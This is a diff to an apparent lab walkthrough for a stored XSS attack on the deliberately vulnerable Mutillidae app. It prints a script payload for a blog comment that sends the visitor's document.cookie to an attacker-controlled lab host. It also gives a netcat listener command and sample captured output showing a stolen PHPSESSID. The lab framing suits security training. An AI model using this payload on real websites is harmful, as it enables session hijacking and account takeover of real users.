@@ -1,7 +1,7 @@
 
 ---
 
-### 💉 2. Inject Stored XSS Payload
+### 💉  Inject Stored XSS Payload
 
 In the blog comment field, paste the following code and submit:
 
@@ -10,3 +10,27 @@ In the blog comment field, paste the following code and submit:
   var i = new Image();
   i.src = "http://192.168.***.***:5000?" + document.cookie;
 </script>
+
+
+
+
+💻  Open Listener on Kali (Attacker Machine)
+On the Kali terminal, run:
+
+nc -lvp 5000
+You're now listening for incoming HTTP requests on port 5000.
+
+👁️ View the Victim Blog Page
+Open this page from another browser or machine to simulate a victim visiting the infected blog:
+
+
+http://192.168.237.131/mutillidae/index.php?page=view-someones-blog.php
+
+🕵️‍♂️  Get the Cookie
+On your Kali terminal (where Netcat is listening), you'll see something like:
+
+
+connect to [192.168.237.130] from (UNKNOWN) [192.168.237.1] 23946
+GET /?PHPSESSID=abcdef123456789 HTTP/1.1
+
+Boom! You got their session cookie 🥳
